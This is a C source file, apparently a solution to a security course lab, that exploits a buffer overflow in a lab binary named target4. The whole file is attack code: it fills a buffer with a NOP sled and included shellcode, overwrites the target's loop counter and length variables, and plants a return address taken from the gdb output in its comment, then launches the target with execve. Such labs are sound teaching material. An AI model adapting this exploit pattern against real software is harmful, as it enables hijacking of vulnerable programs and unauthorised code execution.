#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target4"

/*
  (gdb) p &buf
  $1 = (char (*)[156]) 0x3021fdf0
  (gdb) p &len
  $2 = (int *) 0x3021fe9c
  (gdb) p &i
  $3 = (int *) 0x3021fe98
*/

int main(void)
{
  char *args[3];
  char *env[1];

  char buf[189];
  int i;

  // Fill up the buffer with NOP
  for (i = 0; i < 189; i++) {
      buf[i] = '\x90';
  }

  // Inject shellcode
  int shellcode_len = strlen(shellcode);
  for (int i = 0; i < shellcode_len; i++) {
      buf[i] = shellcode[i];
  }

  // i, pad \x01 because it should not be \x90 or \x00, so fill in small values
  buf[168] = '\xff';
  buf[169] = '\x01';
  buf[170] = '\x01';
  buf[171] = '\x01';

  // len
  buf[172] = '\xff';
  buf[173] = '\x01';
  buf[174] = '\x01';
  buf[175] = '\x01';

  // buffer
  buf[184] = '\xf0';
  buf[185] = '\xfd';
  buf[186] = '\x21';
  buf[187] = '\x30';

  args[0] = TARGET;
  args[1] = buf;
  args[2] = NULL;

  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return (0);
}
